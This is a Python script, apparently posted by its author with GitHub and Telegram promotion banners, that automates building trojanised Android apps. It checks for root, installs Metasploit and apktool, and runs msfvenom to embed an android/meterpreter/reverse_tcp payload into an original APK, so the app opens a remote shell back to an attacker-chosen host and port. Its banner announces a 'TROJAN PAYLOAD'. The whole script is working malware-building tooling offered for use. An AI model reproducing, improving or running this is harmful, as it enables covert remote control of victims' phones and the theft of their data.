import os
import argparse
import subprocess
from termcolor import colored

ascii_art = r"""
   ██████╗ ███████╗███████╗
  ██╔═══╝ ██╔════╝██╔════╝
 █████╗   █████╗  █████╗  
 ╚═════╝   ╚════╝  ╚════╝  
╔════════════════════════════════════╗
║                                    ║
║         READY TO INITIATE          ║
║           TROJAN PAYLOAD           ║
║                                    ║
╚════════════════════════════════════╝
"""

github_banner = colored(
    """
🌟 Check Out My GitHub for More Scripts and Projects:
   https://github.com/inits5/""", 'white', 'on_dark_grey', attrs=['bold']
)

telegram_banner = colored(
    """
📢 Follow My Telegram Channel for Updates and Guides:
   https://t.me/scripted_seer""", 'white', 'on_blue', attrs=['bold']
)

print(colored(ascii_art, 'cyan', attrs=['bold']))
print(github_banner)
print(telegram_banner)

if os.geteuid() != 0:
    print(colored("\n🚨 Permission Denied: Please run this script as root or use sudo.", 'red', attrs=['bold']))
    exit(1)

class StyledHelpFormatter(argparse.RawTextHelpFormatter):
    def _format_action_invocation(self, action):
        return colored(", ".join(action.option_strings), 'yellow') if action.option_strings else super()._format_action_invocation(action)

    def _format_usage(self, usage, actions, groups, prefix):
        return colored(f"Usage: {usage}\n", 'cyan')

parser = argparse.ArgumentParser(
    description=colored("📦 Generate Reverse Shell Payloads for Android APK Files", 'green', attrs=['bold']),
    formatter_class=StyledHelpFormatter
)

parser.add_argument('-l', '--lhost', required=True, help=colored("🌐 Local IP Address", 'yellow'))
parser.add_argument('-p', '--lport', required=True, help=colored("📡 Listening Port", 'yellow'))
parser.add_argument('-o', '--output_apk', required=True, help=colored("💾 Output APK Path", 'yellow'))
parser.add_argument('-a', '--original_apk', required=True, help=colored("📂 Original APK File Path", 'yellow'))
args = parser.parse_args()

if not os.path.exists(args.original_apk):
    print(colored(f"📂 Original APK not found: {args.original_apk}", 'red'))
    exit(1)

required_tools = ['metasploit-framework', 'apktool']

def ensure_tools_installed():
    for tool in required_tools:
        print(colored(f"🔍 Checking for {tool}...", 'blue'))
        try:
            subprocess.run(['dpkg', '-s', tool], check=True, stdout=subprocess.DEVNULL)
            print(colored(f"✔️ {tool} is installed.", 'green'))
        except subprocess.CalledProcessError:
            print(colored(f"⚠️ Installing {tool}...", 'yellow'))
            subprocess.run(['apt', 'install', '-y', tool], check=True)

ensure_tools_installed()

payload_command = f"msfvenom -x \"{args.original_apk}\" -p android/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={args.lport} R > \"{args.output_apk}\""
print(colored("\n🛠️ Generating payload...", 'blue'))

try:
    subprocess.run(payload_command, shell=True, check=True)
    print(colored(f"\n🎉 Payload created successfully at: {args.output_apk}", 'green', attrs=['bold']))
except subprocess.CalledProcessError:
    print(colored("\n🚨 Failed to create payload!", 'red'))

print(colored("\n🌟 Done! Stay updated via my GitHub or Telegram! 🚀", 'cyan', attrs=['bold']))
